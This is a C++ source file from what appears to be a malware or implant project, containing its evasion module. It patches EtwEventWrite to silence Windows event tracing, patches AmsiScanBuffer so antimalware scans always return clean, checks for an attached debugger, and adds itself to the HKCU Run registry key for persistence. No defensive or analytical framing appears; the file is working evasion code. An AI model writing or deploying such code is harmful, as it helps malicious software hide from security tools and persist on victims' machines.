#include "Evasion.h"
#include "Config.h"
#include <iostream>

void Evasion::PatchETW() {
    // Patch EtwEventWrite to return
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return;
    void* etwEventWrite = GetProcAddress(ntdll, "EtwEventWrite");
    if (!etwEventWrite) return;

    DWORD oldProtect;
    VirtualProtect(etwEventWrite, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
    *(BYTE*)etwEventWrite = 0xC3; // ret
    VirtualProtect(etwEventWrite, 1, oldProtect, &oldProtect);
}

void Evasion::PatchAMSI() {
    // Patch AmsiScanBuffer to always return clean
    HMODULE amsi = LoadLibraryA("amsi.dll");
    if (!amsi) return;
    void* amsiScanBuffer = GetProcAddress(amsi, "AmsiScanBuffer");
    if (!amsiScanBuffer) return;

    DWORD oldProtect;
    VirtualProtect(amsiScanBuffer, 6, PAGE_EXECUTE_READWRITE, &oldProtect);
    // return S_OK (0)
    byte patch[] = { 0x31, 0xC0, 0xC3 }; // xor eax, eax; ret
    memcpy(amsiScanBuffer, patch, sizeof(patch));
    VirtualProtect(amsiScanBuffer, 6, oldProtect, &oldProtect);
}

bool Evasion::IsDebuggerPresentCheck() {
    return IsDebuggerPresent() || (NtCurrentPeb()->BeingDebugged);
}

void Evasion::ApplyPersistence() {
    HKEY hKey;
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    
    RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
    RegSetValueExA(hKey, Config::TASK_NAME, 0, REG_SZ, (const BYTE*)path, (DWORD)strlen(path) + 1);
    RegCloseKey(hKey);
}
